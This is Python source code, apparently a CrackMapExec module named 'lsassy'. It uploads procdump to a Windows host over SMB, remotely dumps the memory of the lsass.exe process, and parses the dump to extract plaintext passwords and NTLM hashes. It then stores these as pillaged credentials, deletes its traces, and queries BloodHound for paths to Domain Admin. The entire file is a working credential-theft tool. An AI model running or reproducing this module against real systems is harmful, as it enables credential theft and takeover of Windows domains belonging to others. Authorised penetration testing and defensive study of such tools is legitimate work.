# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

import os
import sys
import re
import time
import subprocess
import json


class CMEModule:
    name = 'lsassy'
    description = "Dump lsass via procdump and parse the result remotely with lsassy"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
            SHARE               Share to upload procdump and dump lsass (default: C$)
            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
            REMOTE_LSASS_DUMP   Name of the remote lsass dump (default: tmp.dmp)
            BLOODHOUND          Enable Bloodhound integration (default: false)
            NEO4JURI            URI for Neo4j database (default: 127.0.0.1)
            NEO4JPORT           Listeninfg port for Neo4j database (default: 7687)
            NEO4JUSER           Username for Neo4j database (default: 'neo4j')
            NEO4JPASS           Password for Neo4j database (default: 'neo4j')
            WITHOUT_EDGES       List of black listed edges (example: 'SQLAdmin,CanRDP', default: '')
        '''

        self.tmp_dir = "\\Windows\\Temp\\"
        self.share = "C$"
        self.procdump = "procdump.exe"
        self.procdump_path = "/tmp/"
        self.remote_lsass_dump = "tmp.dmp"

        if 'TMP_DIR' in module_options:
            self.tmp_dir = module_options['TMP_DIR']

        if 'SHARE' in module_options:
            self.share = module_options['SHARE']

        if 'PROCDUMP_PATH' in module_options:
            self.procdump_path = module_options['PROCDUMP_PATH']

        if 'PROCDUMP_EXE_NAME' in module_options:
            self.procdump = module_options['PROCDUMP_EXE_NAME']

        if 'REMOTE_LSASS_DUMP' in module_options:
            self.remote_lsass_dump = module_options['REMOTE_LSASS_DUMP']

        self.bloodhound = False
        self.neo4j_URI = "127.0.0.1"
        self.neo4j_Port = "7687"
        self.neo4j_user = "neo4j"
        self.neo4j_pass = "neo4j"
        self.without_edges = ""

        if module_options and 'BLOODHOUND' in module_options:
            self.bloodhound = module_options['BLOODHOUND']
        if module_options and 'NEO4JURI' in module_options:
            self.neo4j_URI = module_options['NEO4JURI']
        if module_options and 'NEO4JPORT' in module_options:
            self.neo4j_Port = module_options['NEO4JPORT']
        if module_options and 'NEO4JUSER' in module_options:
            self.neo4j_user = module_options['NEO4JUSER']
        if module_options and 'NEO4JPASS' in module_options:
            self.neo4j_pass = module_options['NEO4JPASS']
        if module_options and 'WITHOUT_EDGES' in module_options:
            self.without_edges = module_options['WITHOUT_EDGES']

    def on_admin_login(self, context, connection):
        if self.bloodhound != False:
            self.set_as_owned(context, connection)

        # Verify procdump exists on host
        procdump_full_path = os.path.join(self.procdump_path, self.procdump)
        if not os.path.exists(self.procdump_path):
            context.log.error("{} directory does not exist.".format(self.procdump_path))
            return 1
        elif not os.path.exists(procdump_full_path):
            context.log.error("{} does not exist.".format(procdump_full_path))
            return 1

        # Upload procdump
        context.log.debug('Copy {} to {}'.format(procdump_full_path, self.tmp_dir))
        with open(procdump_full_path, 'rb') as procdump:
            try:
                connection.conn.putFile(self.share, self.tmp_dir + self.procdump, procdump.read)
                context.log.debug('Created file {} on the \\\\{}{}'.format(self.procdump, self.share, self.tmp_dir))
            except Exception as e:
                context.log.error('Error writing file to share {}: {}'.format(self.share, e))

        # Dump lsass remotely
        dumped = False
        while not dumped:
            # Dump using lsass PID
            command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
                self.tmp_dir, self.procdump, self.tmp_dir, self.remote_lsass_dump)
            context.log.debug('Dumping lsass.exe')
            p = connection.execute(command, True)
            context.log.debug(p)

            if 'Dump 1 complete' in p:
                # Procdump ended
                context.log.debug('Procdump output fully retrieved')
                dumped = True
            elif 'Dump 1 initiated' in p:
                # Procdump output not fully retrieved
                context.log.debug('Procdump output partially retrieved')
                # Since we cannot know when the dump finishes, we wait for 2s
                time.sleep(5)
                dumped = True
            elif 'The version of this file is not compatible' in p or 'Cette version de' in p:
                context.log.error(
                    'Provided procdump executable and target architecture are incompatible (32 bits / 64 bits)')
                return 1
            else:
                context.log.error('Process lsass.exe error on dump, try with --verbose to see details')
                return 1

        context.log.success("Process lsass.exe was successfully dumped")

        """
        Since lsassy is py3.6+ and CME is still py2, lsassy cannot be
        imported. For this reason, connection information must be sent to lsassy
        so it can create a new connection.

        When CME is py3.6 compatible, CME connection object will be reused.
        """
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")
        host = connection.host

        py_arg = "{}/{}:{}@{}:/{}{}".format(
            domain_name, username, password, host, self.share, os.path.join(self.tmp_dir, self.remote_lsass_dump)
        ).replace("\\", "/")

        command = r"lsassy -j --hashes {}:{} {}".format(lmhash, nthash, py_arg, self.procdump_path + self.remote_lsass_dump)

        # Parsing lsass dump remotely
        context.log.info('Parsing dump file with lsassy')
        code, out, err = self.run(command)

        if code != 0:
            # Debug output
            context.log.error('Error while executing lsassy, try using CrackMapExec with --verbose to get more details')
            context.log.debug('Detailed error : {}'.format(err))
        else:
            context.log.debug('----- lsassy output -----')
            context.log.debug('{}'.format(out))
            context.log.debug('-----   end output  -----')
            self.process_credentials(context, connection, out)

        # Delete lsass dump
        try:
            connection.conn.deleteFile(self.share, self.tmp_dir + self.remote_lsass_dump)
            context.log.success('Deleted lsass dump')
        except Exception as e:
            context.log.error('Error deleting lsass dump : {}'.format(e))

        # Delete procdump.exe
        try:
            connection.conn.deleteFile(self.share, self.tmp_dir + self.procdump)
            context.log.success('Deleted procdump.exe')
        except Exception as e:
            context.log.error('Error deleting procdump.exe : {}'.format(e))

    def run(self, cmd):
        proc = subprocess.Popen([
            '/bin/sh', '-c', cmd],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        stdout, stderr = proc.communicate()

        return proc.returncode, stdout, stderr

    def process_credentials(self, context, connection, credentials):
        credentials = json.loads(credentials)
        for domain, users in credentials.items():
            for username, creds in users.items():
                for cred in creds:
                    password = cred['password']
                    lmhash = cred['lmhash']
                    nthash = cred['nthash']
                    self.save_credentials(context, connection, domain, username, password, lmhash, nthash)
                    self.print_credentials(context, connection, domain, username, password, lmhash, nthash)

    def save_credentials(self, context, connection, domain, username, password, lmhash, nthash):
        hostid = context.db.get_computers(connection.host)[0][0]
        if password is not None:
            credtype = 'plaintext'
        else:
            credtype = 'hash'
            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)

    def print_credentials(self, context, connection, domain, username, password, lmhash, nthash):
        if password is None:
            password = ':'.join(h for h in [lmhash, nthash] if h is not None)
        output = "%s\\%s %s" % (domain.decode('utf-8'), username.decode('utf-8'), password.decode('utf-8'))
        if self.bloodhound and self.bloodhound_analysis(context, connection, username):
            output += " [{}PATH TO DA{}]".format('\033[91m', '\033[93m') # Red and back to yellow
        context.log.highlight(output)

    def set_as_owned(self, context, connection):
        from neo4j.v1 import GraphDatabase
        from neo4j.exceptions import AuthError, ServiceUnavailable
        hostFQDN = (connection.hostname + "." + connection.domain).upper()
        uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)

        try:
            driver = GraphDatabase.driver(uri, auth=(self.neo4j_user, self.neo4j_pass))
        except AuthError as e:
            context.log.error(
                "Provided credentials ({}:{}) are not valid. See --options".format(self.neo4j_user, self.neo4j_pass))
            sys.exit()
        except ServiceUnavailable as e:
            context.log.error("Neo4J does not seem to be available on {}. See --options".format(uri))
            sys.exit()
        except Exception as e:
            context.log.error("Unexpected error : {}".format(e))
            sys.exit()

        with driver.session() as session:
            with session.begin_transaction() as tx:
                result = tx.run(
                    "MATCH (c:Computer {{name:\"{}\"}}) SET c.owned=True RETURN c.name AS name".format(hostFQDN))
        if len(result.value()) > 0:
            context.log.success("Node {} successfully set as owned in BloodHound".format(hostFQDN))
        else:
            context.log.error(
                "Node {} does not appear to be in Neo4J database. Have you imported correct data ?".format(hostFQDN))
        driver.close()

    def bloodhound_analysis(self, context, connection, username):
        from neo4j.v1 import GraphDatabase
        from neo4j.exceptions import AuthError, ServiceUnavailable
        username = (username + "@" + connection.domain).upper().replace("\\", "\\\\")
        uri = "bolt://{}:{}".format(self.neo4j_URI, self.neo4j_Port)

        try:
            driver = GraphDatabase.driver(uri, auth=(self.neo4j_user, self.neo4j_pass))
        except AuthError as e:
            context.log.error(
                "Provided credentials ({}:{}) are not valid. See --options".format(self.neo4j_user, self.neo4j_pass))
            return False
        except ServiceUnavailable as e:
            context.log.error("Neo4J does not seem to be available on {}. See --options".format(uri))
            return False
        except Exception as e:
            context.log.error("Unexpected error : {}".format(e))
            return False

        edges = [
            "MemberOf",
            "HasSession",
            "AdminTo",
            "AllExtendedRights",
            "AddMember",
            "ForceChangePassword",
            "GenericAll",
            "GenericWrite",
            "Owns",
            "WriteDacl",
            "WriteOwner",
            "CanRDP",
            "ExecuteDCOM",
            "AllowedToDelegate",
            "ReadLAPSPassword",
            "Contains",
            "GpLink",
            "AddAllowedToAct",
            "AllowedToAct",
            "SQLAdmin"
        ]
        # Remove blacklisted edges
        without_edges = [e.lower() for e in self.without_edges.split(",")]
        effective_edges = [edge for edge in edges if edge.lower() not in without_edges]

        with driver.session() as session:
            with session.begin_transaction() as tx:
                query = """
                    MATCH (n:User {{name:\"{}\"}}),(m:Group),p=shortestPath((n)-[r:{}*1..]->(m))
                    WHERE m.objectsid ENDS WITH "-512" 
                    RETURN COUNT(p) AS pathNb
                    """.format(username, '|'.join(effective_edges))

                context.log.debug("Query : {}".format(query))
                result = tx.run(query)
        driver.close()
        return result.value()[0] > 0
